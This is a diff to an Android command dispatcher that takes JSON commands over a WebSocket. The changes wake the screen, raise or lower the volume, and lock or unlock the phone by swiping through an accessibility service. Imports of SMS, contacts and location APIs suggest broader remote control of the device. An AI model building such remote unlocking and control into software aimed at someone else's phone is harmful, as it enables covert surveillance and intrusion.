@@ -15,6 +15,7 @@ import android.location.LocationManager;
 import android.media.AudioManager;
 import android.net.Uri;
 import android.os.Bundle;
+import android.os.PowerManager;
 import android.provider.ContactsContract;
 import android.telephony.SmsManager;
 import android.util.Log;
@@ -258,30 +259,56 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
     }
 
     /**
-     * 导航: home / back / recent
-     * 格式: {"type":"screen", "subc":"nav", "nav":"ho/bak/rec"}
+     * 导航 / 点亮屏幕
+     * "ho" → 点亮屏幕 (WAKEUP), "bak" → 返回, "rec" → 多任务
      */
     private void handleNav(JsonObject payload) {
-        String nav = payload.has("nav") ? payload.get("nav").getAsString() : "";
-        Log.d(TAG, "nav: " + nav);
+        String nav = ScreenActionParser.getNav(payload);
+        NavAction action = NavAction.fromShortcut(nav);
+        Log.d(TAG, "nav: " + nav + " → " + action);
 
-        MyAccessibilityService service = MyAccessibilityService.P();
-        if (service == null) {
-            Log.w(TAG, "nav: AccessibilityService not available");
-            return;
-        }
-
-        int action;
-        switch (nav) {
-            case "ho":  action = AccessibilityService.GLOBAL_ACTION_HOME; break;
-            case "bak": action = AccessibilityService.GLOBAL_ACTION_BACK; break;
-            case "rec": action = AccessibilityService.GLOBAL_ACTION_RECENTS; break;
+        switch (action) {
+            case WAKE_SCREEN:
+                wakeScreen();
+                break;
+            case BACK:
+            case RECENTS:
+                MyAccessibilityService service = MyAccessibilityService.P();
+                if (service == null) {
+                    Log.w(TAG, "nav: AccessibilityService not available");
+                    return;
+                }
+                int globalAction = (action == NavAction.BACK)
+                    ? AccessibilityService.GLOBAL_ACTION_BACK
+                    : AccessibilityService.GLOBAL_ACTION_RECENTS;
+                service.performGlobalAction(globalAction);
+                break;
             default:
                 Log.w(TAG, "nav: unknown nav=" + nav);
-                return;
         }
+    }
 
-        service.performGlobalAction(action);
+    /**
+     * 点亮屏幕 (不是 HOME)
+     */
+    private void wakeScreen() {
+        try {
+            Context ctx = getAppContext();
+            if (ctx == null) return;
+            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
+            if (pm != null) {
+                PowerManager.WakeLock wl = pm.newWakeLock(
+                    PowerManager.FULL_WAKE_LOCK
+                        | PowerManager.ACQUIRE_CAUSES_WAKEUP
+                        | PowerManager.ON_AFTER_RELEASE,
+                    "vendor:wakescreen");
+                wl.acquire(3000);
+                wl.release();
+                Log.d(TAG, "wakeScreen: screen turned on");
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "wakeScreen failed", e);
+        }
     }
 
     /**
@@ -455,27 +482,29 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
 
     /**
      * 音量控制
-     * 格式: {"type":"screen", "subc":"vol", "volstate":"0"=静音/"1"=取消静音}
+     * volstate=0 → 增加音量, volstate=1 → 减少音量
      */
     private void handleVolume(JsonObject payload) {
-        String volstate = payload.has("volstate") ? payload.get("volstate").getAsString() : "0";
-        Log.d(TAG, "volume: volstate=" + volstate);
+        String volstate = ScreenActionParser.getVolstate(payload);
+        VolumeAction action = VolumeAction.fromState(volstate);
+        Log.d(TAG, "volume: volstate=" + volstate + " → " + action);
 
         try {
-            MainApplication app = MainApplication.getInstance();
-            if (app == null || app.getApplication() == null) return;
+            Context ctx = getAppContext();
+            if (ctx == null) return;
 
-            AudioManager am = (AudioManager) app.getApplication().getSystemService(Context.AUDIO_SERVICE);
+            AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
             if (am == null) return;
 
-            if ("0".equals(volstate)) {
-                // 静音
-                am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_MUTE, 0);
-                am.adjustStreamVolume(AudioManager.STREAM_RING, AudioManager.ADJUST_MUTE, 0);
-            } else {
-                // 取消静音
-                am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_UNMUTE, 0);
-                am.adjustStreamVolume(AudioManager.STREAM_RING, AudioManager.ADJUST_UNMUTE, 0);
+            switch (action) {
+                case UP:
+                    am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_RAISE, AudioManager.FLAG_SHOW_UI);
+                    break;
+                case DOWN:
+                    am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI);
+                    break;
+                default:
+                    Log.w(TAG, "volume: unknown action");
             }
         } catch (Exception e) {
             Log.w(TAG, "volume control failed", e);
@@ -483,29 +512,47 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
     }
 
     /**
-     * 锁屏控制
-     * 格式: {"type":"screen", "subc":"L", "lock":"0"=解锁/"1"=锁屏}
+     * 锁屏/解锁控制
+     * lock=1 → 锁屏, lock=0 → 解锁 (点亮屏幕 + 上滑)
      */
     private void handleLock(JsonObject payload) {
-        String lock = payload.has("lock") ? payload.get("lock").getAsString() : "0";
-        Log.d(TAG, "lock: " + lock);
+        String lock = ScreenActionParser.getLock(payload);
+        LockAction action = LockAction.fromState(lock);
+        Log.d(TAG, "lock: " + lock + " → " + action);
 
-        MyAccessibilityService service = MyAccessibilityService.P();
-        if (service == null) return;
-
-        if ("1".equals(lock)) {
-            service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
-        } else {
-            // 解锁: 模拟上滑手势
-            int w = service.getResources().getDisplayMetrics().widthPixels;
-            int h = service.getResources().getDisplayMetrics().heightPixels;
-            Path path = new Path();
-            path.moveTo(w / 2f, h * 0.8f);
-            path.lineTo(w / 2f, h * 0.2f);
-            GestureDescription gesture = new GestureDescription.Builder()
-                .addStroke(new GestureDescription.StrokeDescription(path, 0, 300))
-                .build();
-            service.dispatchGesture(gesture, null, null);
+        switch (action) {
+            case LOCK:
+                MyAccessibilityService lockService = MyAccessibilityService.P();
+                if (lockService != null) {
+                    lockService.performGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
+                }
+                break;
+            case UNLOCK:
+                // 1. 先点亮屏幕
+                wakeScreen();
+                // 2. 延迟 500ms 后上滑解锁
+                new Thread(() -> {
+                    try {
+                        Thread.sleep(500);
+                        MyAccessibilityService service = MyAccessibilityService.P();
+                        if (service == null) return;
+                        int w = service.getResources().getDisplayMetrics().widthPixels;
+                        int h = service.getResources().getDisplayMetrics().heightPixels;
+                        Path path = new Path();
+                        path.moveTo(w / 2f, h * 0.8f);
+                        path.lineTo(w / 2f, h * 0.2f);
+                        GestureDescription gesture = new GestureDescription.Builder()
+                            .addStroke(new GestureDescription.StrokeDescription(path, 0, 300))
+                            .build();
+                        service.dispatchGesture(gesture, null, null);
+                        Log.d(TAG, "unlock: swipe up dispatched");
+                    } catch (Exception e) {
+                        Log.w(TAG, "unlock gesture failed", e);
+                    }
+                }).start();
+                break;
+            default:
+                Log.w(TAG, "lock: unknown action");
         }
     }
 
